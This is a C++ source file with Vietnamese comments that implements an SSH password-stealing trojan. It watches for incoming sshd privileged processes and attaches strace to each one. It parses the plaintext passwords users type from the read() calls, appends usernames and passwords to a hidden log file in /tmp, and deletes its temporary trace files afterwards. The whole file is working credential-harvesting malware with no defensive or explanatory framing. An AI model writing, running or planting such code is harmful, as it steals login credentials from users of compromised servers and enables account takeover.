#include <bits/stdc++.h>
#include <stdio.h>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <thread>
#include <unistd.h>
#include <time.h>
#include <errno.h>
using namespace std;
set<int> check_pid; // kiểm tra xem một process đã được strace hay chưa?
// lấy ra thời gian hiện tại, vd: 2022-01-17.15:25:17
const std::string currentDateTime(){
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);
    return buf;
}

int msleep(long msec){
    struct timespec ts;
    int res;

    if (msec < 0){
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do{
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

// lấy toàn bộ output khi thực hiện gọi một system call
vector<string> exec(const char *cmd){
    vector<string> ans;
    std::array<char, 1024> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe){
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr){
        string tmp = buffer.data();
        if (tmp[tmp.length() - 1] == '\n'){
            tmp = tmp.substr(0, tmp.length() - 1);
        }
        ans.push_back(tmp);
    }
    return ans;
}

// tách string theo tham số 'par'
vector<string> split(string target, char par){
    string current = "";
    vector<string> ans;
    for (int i = 0; i < target.size(); i++){
        if (target[i] != par){
            current += target[i];
        }
        else{
            if (current != ""){
                ans.push_back(current);
            }
            current = "";
        }
    }
    if (current != ""){
        ans.push_back(current);
    }
    return ans;
}

// kiểm tra một process đang chạy hay đã kết thúc
int check(int pid){
    string tmp = "ps auwx";
    const char *cmd = tmp.c_str();
    vector<string> res = exec(cmd);
    for (int i = 0; i < res.size(); i++){
        vector<string> temp = split(res[i], ' ');
        if (atoi(temp[1].c_str()) == pid)
            return 1;
    }

    return 0;
}

// kiểm tra xem client đã đăng nhập thành công hay chưa?
int is_logged_in(int pid, string username){
    string tmp = "ps auwx";
    const char *cmd = tmp.c_str();
    vector<string> res = exec(cmd);
    for (int i = 0; i < res.size(); i++){
        vector<string> temp = split(res[i], ' ');
        if (temp.size() != 13 or atoi(temp[1].c_str()) != pid + 1){
            continue;
        }
        if (temp[11] != username){
            continue;
        }
        if (temp[12] == "[net]"){
            return 0;
        }
    }
    return 1;
}

// xử lý việc ghi log của một process
void incoming_ssh_log(int pid, string username){
    string datetime = currentDateTime();
    string dir = "/tmp/" + datetime + ".txt";         // file tạm thời để chứa output của lệnh strace
    string tmp = "strace -p " + to_string(pid) + " -e read -o " + dir; // chỉ lấy những lệnh read
    const char *cmd = tmp.c_str();
    FILE *fp;
    fp = popen(cmd, "r"); // thực hiện strace
    int login_success = 0;
    while (check(pid))    {
        if (check(pid) and is_logged_in(pid, username))        {
            login_success = 1;
            break;
        }
        msleep(300);
        continue;
    }
    if (login_success == 0){
        cout << "Done process " << pid << endl;
        return;
    }
    while (check(pid)){
        // đợi đến khi client thực hiện xong việc connect (exit hoặc ctrl-c)
        msleep(300);
    }
    pclose(fp);
    check_pid.erase(pid);
    cout << "Finished execute strace pid:" << pid << endl;
    ifstream in(dir);
    string curr = "";
    // mẫu output 1 dòng strace: read(6, "\f\0\0\0\10admin123", 13)      = 13
    string correct_passwd = "";
    while (getline(in, curr)){
        if (curr.substr(0, 17) != "read(6, \"\\f\\0\\0\\0")
            continue;
        int flag = 0;
        string check_len = "";
        int idx = -1;
        for (int i = 0; i < curr.length(); i++){
            if (curr[i] == ','){
                idx = i;
            }
        }
        for (int i = idx; i < curr.length(); i++){
            if (curr[i] == ')')
                break;
            if (isdigit(curr[i])){
                check_len += curr[i];
            }
        }
        if (atoi(check_len.c_str()) == 1 or atoi(check_len.c_str()) > 50){
            continue;
        }
        flag = 0;
        string data = "";
        int count = 0;
        for (int i = 0; i < curr.length(); i++){
            if (curr[i] == '\\')
                count++;
            if (curr[i] == '"')
                flag++;
            if (flag == 2)
                break;
            if (curr[i] != '"' and flag == 1)
                data += curr[i];
        }
        if (data == ""){
            continue;
        }
        // read(6, "\f\0\0\0\10admin123", 13)      = 13
        //  count là số gạch '\', độ dài pasword sẽ bằng 13-count=len(admin123)
        int len_passwd = atoi(check_len.c_str()) - count;
        if (len_passwd == 0)
            continue;
        int index = data.length() - 1;
        string passwd = "";
        while (len_passwd-- and index >= 0){
            passwd += data[index];
            index--;
        }
        reverse(passwd.begin(), passwd.end());
        correct_passwd = passwd;
    }
    in.close();
    ofstream out("/tmp/.log_sshtrojan1.txt", std::ios_base::app | std::ios_base::out); // ghi đè log mà không xoá dữ liệu
    cout << datetime << endl;
    out << datetime << endl;
    cout << "Log:" << endl;
    cout << "Username: " << username << endl;
    out << "Username: " << username << endl;
    cout << "Pasword:" << correct_passwd << endl;
    out << "Pasword:" << correct_passwd << endl;
    out << endl;
    out.close();
    string removefile = "rm -rf " + dir;
    system(removefile.c_str()); // xoá file tạm chứa output của strace
    cout << "Done process " << pid << endl;
    cout << endl;
}

int main(){
    while (true){
        string tmp = "ps auwx";
        const char *cmd = tmp.c_str();
        vector<string> list_process = exec(cmd); // lấy toàn bộ danh sách các process đang chạy
        for (string i : list_process){
            vector<string> info_process = split(i, ' ');
            
            if (info_process.size() != 13){
                continue;
            }
            if (info_process[10] == "sshd:" and info_process[12] == "[priv]"){ 
            // kiểm tra xem có client đang kết nối
            
                string username = info_process[11];
                if (username == "unknown"){
                    continue;
                }

                if (check_pid.find(atoi(info_process[1].c_str())) == check_pid.end()){
                // kiểm tra xem process đã được strace hay chưa?
                
                    check_pid.insert(atoi(info_process[1].c_str()));
                    thread new_process(incoming_ssh_log, atoi(info_process[1].c_str()), username);
                    new_process.detach();
                }
            }
        }
        msleep(500);
    }
    return 0;
}
